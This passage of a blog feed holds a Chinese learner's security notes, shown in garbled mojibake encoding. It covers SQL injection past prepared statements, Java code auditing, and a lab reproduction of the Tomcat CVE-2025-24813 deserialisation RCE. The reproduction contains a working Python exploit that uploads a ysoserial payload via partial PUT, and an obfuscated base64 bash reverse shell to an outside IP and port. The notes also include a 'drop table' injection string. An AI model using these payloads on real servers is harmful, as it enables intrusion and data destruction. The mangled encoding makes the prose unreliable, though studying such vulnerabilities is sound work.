whereè¯­å¥ä¸­çš„å†…å®¹æ˜¯è¢«å‚æ•°åŒ–çš„ã€‚è¿™å°±æ˜¯è¯´ï¼Œé¢„ç¼–è¯‘ä»…ä»…åªèƒ½é˜²å¾¡ä½å¯å‚æ•°åŒ–ä½ç½®çš„sqlæ³¨å…¥ã€‚é‚£ä¹ˆï¼Œå¯¹äºä¸å¯å‚æ•°åŒ–çš„ä½ç½®ï¼Œé¢„ç¼–è¯‘å°†æ²¡æœ‰ä»»ä½•åŠæ³•ã€‚</p><p>ä¸å¯å‚æ•°åŒ–çš„ä½ç½®ï¼š</p><ol><li>è¡¨åã€åˆ—å</li><li>order byã€group by</li><li>limit</li><li>join</li><li>ç­‰</li></ol><p>æˆ‘ä»¬ä»¥order byä¸¾ä¾‹ï¼Œç°åœ¨æœ‰ä¸€ä¸ªsqlè¯­å¥å¦‚ä¸‹ï¼ˆä»¥ä¸‹å‡ä¸ºä¼ªä»£ç ï¼‰</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY &#123;user_input&#125;;<br></code></pre></td></tr></table></figure><p>å…¶ä¸­user_inputæ˜¯ä¼ é€’è¿‡æ¥çš„å‚æ•°ï¼Œä¾‹å¦‚ id</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªè¯­å¥æ˜¯æ²¡æœ‰é—®é¢˜çš„ï¼Œä½†æ˜¯å¦‚æœuser_inputè¾“å…¥ä¸º id;drop table users â€“</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">SELECT * FROM users ORDER BY id;drop table users --+<br></code></pre></td></tr></table></figure><p>è¿™æ ·å°±è¢«æˆåŠŸæ³¨å…¥äº†ï¼Œè€Œè¿™ç§ä½ç½®æ˜¯ä¸å¯è¢«å‚æ•°åŒ–çš„ï¼Œæ‰€ä»¥æ˜¯æ— æ³•é€šè¿‡é¢„ç¼–è¯‘é˜²å¾¡çš„</p><h4 id="å¦‚ä½•é˜²å¾¡"><a href="#å¦‚ä½•é˜²å¾¡" class="headerlink" title="å¦‚ä½•é˜²å¾¡"></a>å¦‚ä½•é˜²å¾¡</h4><p>æ‰€ä»¥ï¼Œå¯¹äºsqlæ³¨å…¥å­˜åœ¨ä¸¤ç§æƒ…å†µï¼Œå¯å‚æ•°åŒ–çš„ï¼Œä¸å¯å‚æ•°åŒ–çš„ã€‚</p><p>å¯¹äºå¯å‚æ•°åŒ–æ²¡å•†é‡ï¼Œç›´æ¥é¢„ç¼–è¯‘è§£å†³ä¸€åˆ‡ã€‚</p><p>è€Œå¯¹äºä¸å¯å‚æ•°åŒ–çš„ï¼Œåªèƒ½é€šè¿‡è®¾ç½®ç™½åå•ï¼Œè¿‡æ»¤ç‰¹æ®Šç¬¦å·ï¼Œé€šè¿‡åŠ å¼•å·å¼ºåˆ¶è½¬ä¸ºå­—ç¬¦ä¸²ç­‰æ–¹å¼è¿›è¡Œæ‹¦æˆªã€‚</p>]]></content>
    
    
    <categories>
      
      <category>Javaä»£ç å®¡è®¡</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Javaä»£ç å®¡è®¡</tag>
      
      <tag>æ¼æ´å­¦ä¹ </tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CVE-2025-24813 RCEå¤ç°</title>
    <link href="/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/"/>
    <url>/2025/06/19/CVE-2025-24813%20RCE%E5%A4%8D%E7%8E%B0/</url>
    
    <content type="html"><![CDATA[<h1 id="CVE-2025-24813-RCEå¤ç°"><a href="#CVE-2025-24813-RCEå¤ç°" class="headerlink" title="CVE-2025-24813 RCEå¤ç°"></a>CVE-2025-24813 RCEå¤ç°</h1><p>å‚è€ƒæ–‡ç« ï¼š</p><p><a href="https://blog.csdn.net/Dalock/article/details/146425886">Tomcat RCEï¼ˆCVE-2025-24813ï¼‰å¤ç°_cve-2025-24813 å¤ç°-CSDNåšå®¢</a></p><p><a href="https://www.freebuf.com/vuls/425025.html">CVE-2025-24813 RCEå¤ç° - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a></p><p><a href="https://blog.meteorkai.top/2025/03/21/CVE-2025-24813-Tomcat-RCE-%E5%88%86%E6%9E%90%E5%A4%8D%E7%8E%B0/#%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E9%83%A8%E5%88%86DefaultServlet-doPut">CVE-2025-24813 Tomcat RCE åˆ†æå¤ç° (meteorkai.top)</a></p><h4 id="æ¼æ´å½±å“èŒƒå›´"><a href="#æ¼æ´å½±å“èŒƒå›´" class="headerlink" title="æ¼æ´å½±å“èŒƒå›´"></a>æ¼æ´å½±å“èŒƒå›´</h4><h4 id="æ¼æ´å½±å“èŒƒå›´-1"><a href="#æ¼æ´å½±å“èŒƒå›´-1" class="headerlink" title="æ¼æ´å½±å“èŒƒå›´"></a>æ¼æ´å½±å“èŒƒå›´</h4><ul><li>9.0.0.M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 9.0.98</li><li>10.1.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 10.1.34</li><li>11.0.0-M1 &lt;&#x3D; Apache Tomcat &lt;&#x3D; 11.0.2</li></ul><h4 id="æ¼æ´åˆ©ç”¨æ¡ä»¶"><a href="#æ¼æ´åˆ©ç”¨æ¡ä»¶" class="headerlink" title="æ¼æ´åˆ©ç”¨æ¡ä»¶"></a>æ¼æ´åˆ©ç”¨æ¡ä»¶</h4><ol><li>DefaultServlet å†™å…¥åŠŸèƒ½å¯ç”¨ï¼šéœ€è¦åœ¨<code>web.xml</code>ä¸­é…ç½®<code>readonly=false</code></li><li>PartialPUTè¯·æ±‚æ”¯æŒï¼štomcatä¸­é»˜è®¤æ”¯æŒåˆ†å—ä¸Šä¼ </li><li>æ–‡ä»¶ä¼šè¯æŒä¹…åŒ–å¯ç”¨ï¼šåœ¨ context.xml ä¸­é…ç½® PersistentManager å’Œ FileStore</li><li>å­˜åœ¨ååºåˆ—åŒ–çš„åˆ©ç”¨é“¾ï¼šéœ€è¦åŒ…å«æ¼æ´çš„åº“ï¼ˆè¿™é‡Œä½¿ç”¨commons-collections-3.2.1.jarï¼‰</li></ol><h4 id="æ¼æ´åŸç†"><a href="#æ¼æ´åŸç†" class="headerlink" title="æ¼æ´åŸç†"></a>æ¼æ´åŸç†</h4><ol><li>Tomcatä¸­æ–‡ä»¶ä¼šè¯æŒä¹…åŒ–æŠ€æœ¯ï¼Œ<code>Content-Range</code>åœ¨Tomcatçš„HTTP PUTè¯·æ±‚ä¸­ä¸»è¦å®ç°ç”¨äºå¤§æ–‡ä»¶çš„åˆ†å—ä¼ è¾“ï¼Œåœ¨æ–‡ä»¶ä¸Šä¼ æœªå®Œæˆçš„æƒ…å†µä¸‹ï¼Œä¼šè¢«ä¸´æ—¶å‚¨å­˜åœ¨Tomcatçš„å·¥ä½œç›®å½•ä¸‹<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>ä¸­</li><li>æ¼æ´æ ¸å¿ƒåœ¨äºï¼šå¯¹ä¸å®Œæ•´çš„PUTè¯·æ±‚ä¸Šä¼ çš„æ–‡ä»¶åå¤„ç†æœºåˆ¶ï¼šæ–‡ä»¶è·¯å¾„ä¸­çš„åˆ†éš”ç¬¦<code>/</code>ä¼šè¢«è½¬åŒ–ä¸º<code>.</code>ã€‚ä¾‹å¦‚ï¼šå¯¹äºPUTè¯·æ±‚çš„è·¯å¾„<code>/evil/session</code>ä¼šè¢«è§£æä¸º<code>.evil.session</code>ä¸­</li><li>Tomcatçš„Fileä¼šè¯å­˜å‚¨é»˜è®¤è·¯å¾„åŒæ ·ä½äºï¼š<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>ï¼Œåœ¨Cookieä¸­å¸¦æœ‰<code>JSESSIONID</code>å­—æ®µæ—¶ï¼ŒTomcatä¼šå°†è¯¥å­—æ®µä¸­çš„<code>.id</code>ä¸<code>.session</code>æ‹¼æ¥ï¼Œå¹¶ä»ä¼šè¯å­˜å‚¨è·¯å¾„ä¸­å¯»æ‰¾æ–‡ä»¶åä¸º<code>.id.session</code>çš„æ–‡ä»¶ï¼Œå¯¹è¯¥æ–‡ä»¶çš„å†…å®¹è¿›è¡Œååºåˆ—åŒ–æ“ä½œï¼Œä»è€Œè§¦å‘æ”»å‡»é“¾</li></ol><h4 id="æ¼æ´åˆ©ç”¨è¿‡ç¨‹"><a href="#æ¼æ´åˆ©ç”¨è¿‡ç¨‹" class="headerlink" title="æ¼æ´åˆ©ç”¨è¿‡ç¨‹"></a>æ¼æ´åˆ©ç”¨è¿‡ç¨‹</h4><ol><li>å½“å­˜åœ¨ååºåˆ—åŒ–åˆ©ç”¨é“¾æ—¶ï¼Œä¸Šä¼ åŒ…å«æ¶æ„çš„åºåˆ—åŒ–æ•°æ®æ–‡ä»¶ï¼ˆä¸´æ—¶å­˜å‚¨åœ¨<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>ï¼‰</li><li>é€šè¿‡è®¾ç½®<code>JSESSIONID=.xxxx</code>æ¥è§¦å‘æ¼æ´ï¼ˆä½ç½®ä¹Ÿåœ¨<code>CATALINA_BASE/work/Catalina/localhost/ROOT</code>ï¼‰</li></ol><h4 id="ç¯å¢ƒæ­å»º"><a href="#ç¯å¢ƒæ­å»º" class="headerlink" title="ç¯å¢ƒæ­å»º"></a>ç¯å¢ƒæ­å»º</h4><ul><li><p>æ–°å»ºä¸€ä¸ªå¯¹åº”çš„tomcaté¡¹ç›®</p></li><li><p>å¯ç”¨DefaultServletå†™å…¥</p><p>åœ¨<code>conf/web.xml</code>ä¸­ï¼Œå°†DefaultServletçš„readonlyé…ç½®ä¸ºfalseï¼ˆé»˜è®¤trueï¼‰ï¼Œå¯ç”¨å†™å…¥åŠŸèƒ½ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">init-param</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-name</span>&gt;</span>readonly<span class="hljs-tag">&lt;/<span class="hljs-name">param-name</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">param-value</span>&gt;</span>false<span class="hljs-tag">&lt;/<span class="hljs-name">param-value</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">init-param</span>&gt;</span><br></code></pre></td></tr></table></figure></li><li><p>å¯ç”¨æ–‡ä»¶ä¼šè¯æŒä¹…åŒ–å¹¶ä½¿ç”¨é»˜è®¤çš„ä¼šè¯å­˜å‚¨ä½ç½®</p><p>åœ¨<code>conf/context.xml</code>ä¸­ï¼Œæ·»åŠ å¦‚ä¸‹é…ç½®ï¼Œå¼€å¯Fileæ–‡ä»¶ä¼šè¯å­˜å‚¨ï¼š</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">Manager</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.PersistentManager&quot;</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">Store</span> <span class="hljs-attr">className</span>=<span class="hljs-string">&quot;org.apache.catalina.session.FileStore&quot;</span>/&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">Manager</span>&gt;</span><br></code></pre></td></tr></table></figure></li></ul><h4 id="æ¼æ´å¤ç°"><a href="#æ¼æ´å¤ç°" class="headerlink" title="æ¼æ´å¤ç°"></a>æ¼æ´å¤ç°</h4><ul><li><p>å°è¯•è¿‡ä½¿ç”¨burpsuitå’Œyakitå‘é€æ•°æ®åŒ…ï¼Œå‘ç°éƒ½ä¸æˆåŠŸï¼Œä¹Ÿæœ‰å‘é€çš„æ–‡ä»¶æ–‡ä»¶åè¢«é‡å†™ä¿å­˜åœ¨&#x2F;tomcatæ–‡ä»¶ä¸‹ï¼Œå°è¯•åå‘ç°åªæœ‰ä½¿ç”¨pythonå†™è„šæœ¬å‘åŒ…èƒ½å¤Ÿæ­£å¸¸ä¿å­˜.sessionæ–‡ä»¶</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> os<br><span class="hljs-keyword">import</span> subprocess<br><span class="hljs-keyword">import</span> requests<br> <br>target = <span class="hljs-string">&quot;http://172.31.80.1:8080/poc/session&quot;</span><br>target_poc = <span class="hljs-string">&quot;http://172.31.80.1:8080/&quot;</span><br> <br><span class="hljs-comment"># ysoserial.jar æ–‡ä»¶è·¯å¾„</span><br>fp = <span class="hljs-string">&#x27;D:\javaæ¼æ´åˆ©ç”¨\ysoserial-all.jar&#x27;</span><br> <br>gadget = <span class="hljs-string">&quot;CommonsCollections5&quot;</span><br>linux_rshell = <span class="hljs-string">&quot;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjguMTMyLzc3NzcgMD4mMQ==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br>linux_cmd = <span class="hljs-string">&quot;touch /tmp/success&quot;</span><br>win_cmd = <span class="hljs-string">&quot;calc&quot;</span><br> <br>command = win_cmd<br> <br><span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> os.path.exists(fp):<br>    <span class="hljs-keyword">raise</span> Exception(<span class="hljs-string">&#x27;jar file not found&#x27;</span>)<br>popen = subprocess.Popen([<span class="hljs-string">&#x27;java&#x27;</span>,<span class="hljs-string">&#x27;-jar&#x27;</span>,fp,gadget,command],<br>                         stdout=subprocess.PIPE)<br> <br>file_body = popen.stdout.read()<br> <br>headers = &#123;<br>    <span class="hljs-string">&#x27;Content-Length&#x27;</span>: <span class="hljs-string">&#x27;3000&#x27;</span>,<br>    <span class="hljs-string">&#x27;Content-Range&#x27;</span>: <span class="hljs-string">&#x27;bytes 0-3000/3200&#x27;</span><br>&#125;<br>response = requests.put(target, data=file_body, headers=headers, timeout=<span class="hljs-number">10</span>)<br><span class="hljs-comment"># print(response.text)</span><br> <br><span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Press Enter to continue...&quot;</span>)<br> <br>response = requests.get(target_poc, cookies=&#123;<span class="hljs-string">&#x27;JSESSIONID&#x27;</span>:<span class="hljs-string">&#x27;.poc&#x27;</span>&#125;, timeout=<span class="hljs-number">10</span>)<br></code></pre></td></tr></table></figure></li><li><p>åœ¨Catalina&#x2F;localhost&#x2F;ROOT&#x2F;org&#x2F;apache&#x2F;jspè·¯å¾„ä¸‹ï¼Œå¯ä»¥çœ‹åˆ°æˆåŠŸä¸Šä¼ äº†å¸¦æœ‰æ¶æ„åºåˆ—åŒ–æ•°æ®çš„æ–‡ä»¶</p><p><img src="/img/CVE02.png"></p><p>ä½†æ˜¯å¹¶æœªå¼¹å‡ºè®¡ç®—å™¨ï¼Œæ˜¾ç¤ºæœåŠ¡å™¨å†…éƒ¨å‡ºé”™</p></li><li><p>åˆ†æåå‘ç°æ˜¯å¯¼å…¥tomcatçš„jaråŒ…æ—¶å‡ºç°ä¸€äº›é—®é¢˜ï¼ŒjaråŒ…æœªå¯¼å…¥åº“ä¸­ï¼ŒåŸå› æœªçŸ¥</p></li></ul><h4 id="æºä»£ç åˆ†æ"><a href="#æºä»£ç åˆ†æ" class="headerlink" title="æºä»£ç åˆ†æ"></a>æºä»£ç åˆ†æ</h4><ul><li><p>jaråŒ…å¯¼å…¥æ—¶å‡ºç°äº†é—®é¢˜ï¼Œæ²¡æœ‰ç»§ç»­è°ƒè¯•äº†ï¼Œåªçœ‹äº†æ–‡ç« </p></li><li><p>ä¸´æ—¶æ–‡ä»¶åˆ›å»ºæºç </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs bash">doPut(DefaultServlet)-&gt;executePartialPut<br>æ¡ä»¶ï¼š<br> 1.readOnly=<span class="hljs-literal">false</span><br> 2.Content-Rangeåˆæ³•<br>executePartialPutæ–¹æ³•æ ¸å¿ƒæ§åˆ¶ï¼š<br>å°†ä¸€ä¸ªpathä¸­çš„/æ›¿æ¢ä¸º.åå½“ä½œæ–‡ä»¶åï¼Œç„¶åå†™å…¥åˆ°å·¥ä½œç›®å½•ä¸‹çš„ROOTè·¯å¾„ä¸‹çš„.poc.sessionä¸­<br>èµ°åˆ°<span class="hljs-built_in">return</span> contentFileæ—¶ï¼Œçš„æ¶æ„æ–‡ä»¶å·²ç»å†™å¥½<br></code></pre></td></tr></table></figure></li><li><p>ååºåˆ—åŒ–æ¼æ´è§¦å‘è¿‡ç¨‹</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash">è§¦å‘ç‚¹ï¼šloadæ–¹æ³•(å…¶ä¸­çš„ç‰¹æ®Šå‡½æ•°:ObjectInputStream ååºåˆ—åŒ–æ¼æ´çš„ç‰¹æ®Šå‡½æ•°)<br>-&gt;fileæ–¹æ³•(æ¥å—Cookieä¸­çš„<span class="hljs-built_in">id</span>ï¼Œç„¶åä¸.sessionæ‹¼æ¥èµ·æ¥ï¼Œç„¶åå°†æ–‡ä»¶åä¸º.poc.sessionçš„Fileç±»å‹çš„å±æ€§è¿”å›å›å»)<br>-&gt;FileInpuStream(å°†æ–‡ä»¶å†…å®¹ä»¥å­—èŠ‚æµçš„æ–¹å¼è¯»å‡º)<br>-&gt;readObject(è¿›è¡Œååºåˆ—åŒ–ï¼Œè§¦å‘æ„é€ çš„æ”»å‡»é“¾)<br></code></pre></td></tr></table></figure></li></ul><h4 id="é—®é¢˜è§£å†³"><a href="#é—®é¢˜è§£å†³" class="headerlink" title="é—®é¢˜è§£å†³"></a>é—®é¢˜è§£å†³</h4><ul><li><p>ä»ç£ç›˜å¯¼å…¥jdkæ—¶ä¸€ç›´æ˜¾ç¤ºä¸æ˜¯jdkæœ‰æ•ˆè·¯å¾„</p><p>è§£å†³ï¼šæ›´æ”¹jdkå®‰è£…è·¯å¾„æ—¶å¿…é¡»å°†æ–°æ–‡ä»¶å¤¹å‘½åä¸ºjdk1.8.0_ç‰ˆæœ¬ï¼Œå¦åˆ™IDEAæ— æ³•è¯†åˆ«</p></li></ul>]]></content>
    
    
    
    <tags>
      
      <tag>CVE</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Javaä»£ç å®¡è®¡</title>
    <link href="/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    <url>/2025/05/27/Java%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
    
    <content type="html"><![CDATA[<h2 id="Javaä»£ç å®¡è®¡"><a href="#Javaä»£ç å®¡è®¡" class="headerlink" title="Javaä»£ç å®¡è®¡"></a>Javaä»£ç å®¡è®¡</h2><ul><li>è¯»æ‡‚ä¸€æ®µä»£ç ï¼šä»ä¸‹åˆ°ä¸Šè¿½è¸ªï¼Œæ‰¾åˆ°å˜é‡çš„ä¼ é€’ä¸å‡½æ•°ä¹‹é—´çš„å…³ç³»ï¼Œç†æ¸…ä»£ç å³å¯å¤§è‡´è¯»æ‡‚</li><li>åˆ†æå˜é‡ç»„æˆï¼šæ‰“å°å‡ºæ¯ä¸ªè¿‡ç¨‹å‚æ•°çš„å€¼é€ä¸ªåˆ†æ(è°ƒè¯•)</li></ul><h3 id="é€šç”¨æ­¥éª¤"><a href="#é€šç”¨æ­¥éª¤" class="headerlink" title="é€šç”¨æ­¥éª¤"></a>é€šç”¨æ­¥éª¤</h3><ul><li>å¯»æ‰¾æ¼æ´è§¦å‘ç‚¹</li><li>æ„é€ payloadå°è¯•åˆ©ç”¨æ¼æ´</li></ul><h3 id="checklist"><a href="#checklist" class="headerlink" title="checklist"></a>checklist</h3><p><a href="https://mp.weixin.qq.com/s/Y90mGgCqzjj0T1NX9E5wDw">Javaä»£ç å®¡è®¡checklistï¼ˆä¸Šï¼‰ (qq.com)</a></p><p><a href="https://mp.weixin.qq.com/s/COXCjMItvrcOCNcqEfbmDg">JAVAæ”»é˜²åŸºç¡€ä¹‹ä»£ç å®¡è®¡ (qq.com)</a></p><h3 id="SQLæ³¨å…¥"><a href="#SQLæ³¨å…¥" class="headerlink" title="SQLæ³¨å…¥"></a>SQLæ³¨å…¥</h3><ul><li><p>ä¸‰ä¸ªæ¨¡å¼</p><p>JDBCï¼ŒMybatisï¼ŒHibernate</p><p>JDBCä¸Mybatisï¼š<a href="https://blog.csdn.net/keyboard_/article/details/127477755">æŒä¹…å±‚æŠ€æœ¯å¯¹æ¯”ï¼šMybatis ä¸ JDBC çš„åŒºåˆ«åˆ°åº•åœ¨å“ªé‡Œ_jdbcå’Œmybatisçš„åº”ç”¨åœºæ™¯-CSDNåšå®¢</a></p></li><li><p>å‡ºç°æ³¨å…¥</p><ul><li>åŸç”ŸJDBCæ˜¯å¦å­˜åœ¨ç›´æ¥æ‹¼æ¥sqlè¯­å¥(ä½¿ç”¨+ï¼Œæˆ–è€…ä½¿ç”¨StringBuilder.append())ï¼Œæœªç»è¿‡é¢„ç¼–è¯‘</li><li>Mybatisä½¿ç”¨${}</li><li>Hibernate, JPAæ˜¯é»˜è®¤ç»è¿‡é¢„ç¼–è¯‘çš„ï¼Œä½†æ˜¯å¼€å‘è‡ªå·±ç¼–å†™çš„sqlè¯­å¥ï¼Œéœ€è¦æ£€æŸ¥</li></ul></li><li><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://mp.weixin.qq.com/s/9t3t6qxosGsKiXMIRtMoPw">JAVAå¸¸ç”¨æ¡†æ¶SQLæ³¨å…¥å®¡è®¡ (qq.com)</a></p></li><li><p>åˆ¤æ–­æ¨¡å¼</p><ul><li>çœ‹é¡¹ç›®ä¸­è¯´æ˜ä½¿ç”¨çš„æŠ€æœ¯æ¡†æ¶</li><li>çœ‹å¼•ç”¨ä¸­åŠ è½½çš„é‚£äº›æŠ€æœ¯æ¡†æ¶</li><li>çœ‹é…ç½®æºç ä¸­ç›¸å…³çš„é…ç½®æ–‡ä»¶</li></ul></li><li><p>å…¥å£ç¡®å®š</p><ol><li>æ˜¯å¦ä½¿ç”¨é¢„ç¼–è¯‘æŠ€æœ¯ï¼Œé¢„ç¼–è¯‘æ˜¯å¦å®Œæ•´</li><li>å®šä½sqlè¯­å¥ä¸Šä¸‹æ–‡ï¼ŒæŸ¥çœ‹æ˜¯å¦æœ‰å‚æ•°ç›´æ¥æ‹¼æ¥ï¼Œæ˜¯å¦å¯¹æ¨¡ç³ŠæŸ¥è¯¢å…³é”®å­—çš„è¿‡æ»¤</li><li>Mybatisæ¡†æ¶åˆ™æœç´¢${}ï¼Œå››ç§æƒ…å†µæ— æ³•é¢„ç¼–è¯‘ï¼šlikeæ¨¡ç³ŠæŸ¥è¯¢ï¼Œorder byæ’åºï¼ŒèŒƒå›´æŸ¥è¯¢inï¼ŒåŠ¨æ€åˆ—åï¼Œè¡¨åï¼Œåªèƒ½æ‹¼æ¥ï¼Œæ‰€ä»¥è¿˜æ˜¯éœ€è¦æ‰‹å·¥é˜²æ³¨å…¥<br>æ³¨ï¼šlikeå’Œinè¯­å¥ç›´æ¥ä½¿ç”¨#{}ä¼šæŠ¥é”™ï¼Œæ”¹ä¸º${}æ¢å¤æ­£å¸¸ä½†æ˜¯æ— æ³•é¢„ç¼–è¯‘</li></ol></li></ul><p>â€‹æ­£ç¡®å†™æ³•ï¼š<br>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><code class="hljs java">  mysql:<br>    select * from users where username like <span class="hljs-title function_">concat</span><span class="hljs-params">(<span class="hljs-string">&#x27;%&#x27;</span>,#&#123;username&#125;,<span class="hljs-string">&#x27;%&#x27;</span>)</span><br>  oracle:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>||#&#123;username&#125;||<span class="hljs-string">&#x27;%&#x27;</span><br>  sqlserver:<br>    select * from users where username like <span class="hljs-string">&#x27;%&#x27;</span>+#&#123;username&#125;+<span class="hljs-string">&#x27;%&#x27;</span><br>  ```  <br><br><br>#### æ­¥éª¤<br><br>- æ‰¾æ¨¡å¼<br>- æœå…³é”®å­—<br>- è¿½è¸ªç¡®å®šå¯æ§å˜é‡<br>- ç¡®å®šè·¯ç”±<br>- æ„é€ payloadæµ‹è¯•<br><br>#### jfinal_cmsæ¡ˆä¾‹<br><br>- æŸ¥çœ‹é…ç½®æ–‡ä»¶å‘ç°æ˜¯JDBCé©±åŠ¨<br><br>- å…¨å±€æœç´¢append()å…³é”®å­—ï¼Œå¯»æ‰¾ä¸sqlç›¸å…³çš„è¯­å¥<br><br>  ![å›¾ç‰‡](/img/javaå®¡è®¡/javaå®¡è®¡<span class="hljs-number">01.</span>png)<br><br>  å‘ç°æ–°å®šä¹‰äº†ä¸€ä¸ªsqlè¯­å¥ï¼Œå¹¶ä¸”ä½¿ç”¨äº†append()å‡½æ•°æ‹¼æ¥<br><br>- åˆ¤æ–­orderByå˜é‡æ˜¯å¦å¯æ§ï¼Œæœ‰æ— è¿‡æ»¤<br><br>  - è¿½è¸ªgetBaseForm()ç±»ä¸getOrderBy()æ–¹æ³•å‘ç°<br><br>    ![](/img/javaå®¡è®¡/javaå®¡è®¡<span class="hljs-number">02.</span>png)<br><br>- æ‰¾åˆ°å¯¹åº”è·¯ç”±åè®¿é—®æŠ“åŒ…ï¼Œå‘ç°æ•°æ®åŒ…ä¸­æœ‰form.orderColumnå‚æ•°ï¼Œæ·»åŠ *å·æ”¾åˆ°sqlmapä¸­æµ‹è¯•payload<br><br>#### oa_system-masteræ¡ˆä¾‹<br><br>- æŸ¥çœ‹æ–‡å­—è¯´æ˜å‘ç°æ­¤oaç³»ç»Ÿä½¿ç”¨çš„æ˜¯Mybatisæ¡†æ¶<br><br>- æŒ‡å®šæ–‡ä»¶æ©ç ä¸º *.xmlï¼Œå…¨å±€æœç´¢$&#123;<br><br>  ![](/img/javaå®¡è®¡/javaå®¡è®¡<span class="hljs-number">03.</span>png)<br><br>  è·³è½¬æŸ¥çœ‹baseKeyå‚æ•°ï¼Œå…¨å±€æœç´¢seleceçš„idå€¼sortMyNotice<br><br>- 